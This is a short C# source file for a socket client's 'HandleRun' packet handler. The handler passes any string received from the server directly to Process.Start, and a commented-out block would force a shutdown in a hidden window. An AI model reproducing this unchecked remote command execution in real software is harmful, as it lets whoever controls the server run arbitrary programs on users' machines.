namespace ConsoleClient.Handle
{
    using ConsoleClient.Packets;
    using MarrySocket.MClient;

    using System;
    using System.Diagnostics;
    public class HandleRun : IHandlePacket
    {
        public void Handle(object receivedClass, ServerSocket serverSocket)
        {
            String rcmd = (String)receivedClass;
            Process.Start(rcmd);

            /*
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = false;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "shutdown.exe";
            startInfo.Arguments = "/s /f /t " + seconds;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            Process p = Process.Start(startInfo);
            string outstring = p.StandardOutput.ReadToEnd();
            string errstring = p.StandardError.ReadToEnd();
            p.WaitForExit();
             * 
             * //**/
            
        }
    }
}
